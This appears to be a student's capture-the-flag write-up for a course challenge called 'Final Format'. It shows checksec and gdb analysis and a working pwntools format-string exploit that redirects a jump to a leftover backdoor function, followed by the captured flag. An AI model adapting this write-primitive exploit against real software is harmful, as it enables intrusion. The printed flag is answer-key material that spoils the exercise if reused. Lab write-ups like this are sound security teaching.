# Opcional CTF - Final Format

- We started this challenge by checking what were the configurations of the _program_ file (using the _checksec_ function). We can see in the image below that this file is protected with canary's. So, writing in the stack would be a tough task.

<img src="CTFs/Opcionals/Img/2-Final_Format/1.checksec.png" alt="file print - result (flag)" width="70%"/><br/>

- For this challenge, the backdoor had been removed. But using the debugger (_gdb_) we were able to find that it was still present in the code (old_backdoor - 0x8049236).
- Using the debugger, we also found a "jump" in the code that would be redirected to other addresses.

<img src="CTFs/Opcionals/Img/2-Final_Format/2.gdb.png" alt="file print - result (flag)" width="70%"/><br/>

- Now, we built a python exploit that would overwrite this address and put the address of the _old_backdoor_, exploring this vulnerabilitie.


```py
from pwn import *

LOCAL = False

if LOCAL:
    pause()
else:    
    p = remote("ctf-fsi.fe.up.pt", 4007)

#0x08049236  old_backdoor

N = 60
content = bytearray(0x0 for i in range(N))

content[0:4]  =  (0xaaaabbbb).to_bytes(4, byteorder='little')
content[4:8]  =  (0x0804c012).to_bytes(4, byteorder='little')
content[8:12]  =  ("????").encode('latin-1')
content[12:16]  =  (0x0804c010).to_bytes(4, byteorder='little')

s = "%.2036x" + "%hn" + "%.35378x%hn"

fmt  = (s).encode('latin-1')
content[16:16+len(fmt)] = fmt

p.recvuntil(b"here...")
p.sendline(content)
p.interactive()
```

- After, we run the exploit built using the following instruction:
```bash
python3.10 exploit_example.py
```

- Finally, we were able to enter the backdoor and cat the flag.

<img src="CTFs/Opcionals/Img/2-Final_Format/3.flag.png" alt="file print - result (flag)" width="70%"/><br/>

### Flag

`flag{4c8515b3a115ecf15875944a6c5738bd}`
